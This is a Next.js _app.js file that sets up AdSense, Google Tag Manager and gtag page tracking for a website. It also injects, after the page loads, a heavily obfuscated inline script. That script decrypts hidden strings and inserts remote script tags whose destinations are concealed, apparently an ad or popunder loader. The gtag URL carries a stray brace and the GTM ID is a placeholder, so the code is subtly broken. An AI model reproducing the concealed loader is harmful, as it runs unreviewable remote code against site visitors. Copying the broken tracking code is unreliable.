import "../styles/globals.css";
import Default from "../Layouts/Default";
import Script from "next/script";
import { useEffect } from "react";
import Router, { useRouter } from "next/router";
import * as gtag from "../lib/gtag";

function MyApp({ Component, pageProps }) {
  const router = useRouter();

  useEffect(() => {
    var ads = document.getElementsByClassName("adsbygoogle").length;
    for (var i = 0; i < ads; i++) {
      try {
        (adsbygoogle = window.adsbygoogle || []).push({});
      } catch (e) {}
    }
  }, [router.asPath]);

  useEffect(() => {
    const handleRouteChange = (url) => {
      gtag.pageview(url);
    };
    router.events.on("routeChangeComplete", handleRouteChange);
    router.events.on("hashChangeComplete", handleRouteChange);
    return () => {
      router.events.off("routeChangeComplete", handleRouteChange);
      router.events.off("hashChangeComplete", handleRouteChange);
    };
  }, [router.events]);
  return (
    <>
      <Script
        type="text/javascript"
        data-cfasync="false"
        strategy="afterInteractive"
        dangerouslySetInnerHTML={{
          __html: `
    /*<![CDATA[/* */
(function(){var bf7fc0d92d8ceb4ccdc98acbe5fae151="EUjhACIGHCh4YPeNO_Jt3mMuZ9P_eSzoU8E03nZX2Um5LYX2fFwu2L-__gPdLBwqUY1TNha0MnfIecM";var a=['w6LCm8OGHsKKwo8Tw4E=','wpcPwqknPcKN','DMKJOwbCpMKuDBDDi0PCu8KAwpnDjzXCsDnDvsKpw4s=','woUIwrIsDcKEDMK7woE=','w5ZTwo84M8Kt','bh/CpMOnwr4wEw==','PRphO8KqwoxkwoMlwozDl3E=','woBxw6bCusOjQTDCr8O9w4NRVcOm','w7VAw4XDm8KdwolRwqTDucOtw5QG','bknCocOpwq9kV8OvURdPwrPDi8OrwqPCjmsqwobDvzxew6lswpvDrsKPJ0vCoMO2RwMQMcKYMn/DjlwGw4vDpn8=','w4/Cn1ktUVUaJsOKOg4WwovCllXCuxlsQcKRV8KELsOHVDvDnHDDu1bCtCYbwrtcwonDucO6WElQSMOMw4g=','aMOzX20UwpFRw4bChQwdwroZw4k=','Yg7CtsO2wrhmSMK0','JcKjKwHDnSp5Tg==','VQrCrcO2','QMO+EcK8JSEPIzk1w7s=','wpVow69iY30=','YxTCscOjwrkoJcO+XxYKwqc=','wrN/MH3DtzEBwrjDl8OJwqIkCg==','TsOlEMKNPwo=','ehvCsMOjwqUoKcO0XRw=','aT55JA==','fsOowpJawpBhJQ==','wo1EOMO8bA==','wo5aw6rDoXVhw4jCtsOhwo8bw4oZw6kI','TmvCjQ=='];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x1f1));var b=function(c,d){c=c-0x0;var e=a[c];if(b['zWTLMR']===undefined){(function(){var h;try{var j=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');h=j();}catch(k){h=window;}var i='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';h['atob']||(h['atob']=function(l){var m=String(l)['replace'](/=+$/,'');var n='';for(var o=0x0,p,q,r=0x0;q=m['charAt'](r++);~q&&(p=o%0x4?p*0x40+q:q,o++%0x4)?n+=String['fromCharCode'](0xff&p>>(-0x2*o&0x6)):0x0){q=i['indexOf'](q);}return n;});}());var g=function(h,l){var m=[],n=0x0,o,p='',q='';h=atob(h);for(var t=0x0,u=h['length'];t<u;t++){q+='%'+('00'+h['charCodeAt'](t)['toString'](0x10))['slice'](-0x2);}h=decodeURIComponent(q);var r;for(r=0x0;r<0x100;r++){m[r]=r;}for(r=0x0;r<0x100;r++){n=(n+m[r]+l['charCodeAt'](r%l['length']))%0x100;o=m[r];m[r]=m[n];m[n]=o;}r=0x0;n=0x0;for(var v=0x0;v<h['length'];v++){r=(r+0x1)%0x100;n=(n+m[r])%0x100;o=m[r];m[r]=m[n];m[n]=o;p+=String['fromCharCode'](h['charCodeAt'](v)^m[(m[r]+m[n])%0x100]);}return p;};b['jvGACM']=g;b['ntWFyK']={};b['zWTLMR']=!![];}var f=b['ntWFyK'][c];if(f===undefined){if(b['vrpQIn']===undefined){b['vrpQIn']=!![];}e=b['jvGACM'](e,d);b['ntWFyK'][c]=e;}else{e=f;}return e;};var w=window;w[b('0xb','ln6&')]=[[b('0x18','tCz9'),0x492333],[b('0x10','[sUk'),0x0],[b('0x8','(z42'),'0'],[b('0x3','S4F*'),0x0],[b('0x2','ln6&'),![]],[b('0x4','Jn1F'),0x0],[b('0x5','uk5o'),!0x0]];var v=[b('0x7','8W#U'),b('0x6','ln6&')],k=0x0,u,p=function(){if(!v[k])return;u=w[b('0xa','@urJ')][b('0xf','eGI]')](b('0xd','EX&P'));u[b('0x12','kx2]')]=b('0x15','aqbY');u[b('0x14','hYl(')]=!0x0;var c=w[b('0x17','GBPi')][b('0x19','HbJD')](b('0x1','DlM1'))[0x0];u[b('0x16','##52')]=b('0x9','ln6&')+v[k];u[b('0xc','[sUk')]=b('0x0','tCz9');u[b('0x13','KN[e')]=function(){k++;p();};c[b('0x11','ln6&')][b('0xe','ln6&')](u,c);};p();})();
/*]]>/* */
  `,
        }}
      />

      <Script
        strategy="afterInteractive"
        dangerouslySetInnerHTML={{
          __html: `
    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer', 'GTM-XXXXXX');
  `,
        }}
      />
      <Script
        strategy="afterInteractive"
        src={`https://www.googletagmanager.com/gtag/js?id=G-VCL4RNBM4L}`}
      />
      <Script
        id="gtag-init"
        strategy="afterInteractive"
        dangerouslySetInnerHTML={{
          __html: `
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'G-VCL4RNBM4L', {
              page_path: window.location.pathname,
            });
          `,
        }}
      />
      <Default>
        <Component {...pageProps} />
      </Default>
    </>
  );
}

export default MyApp;
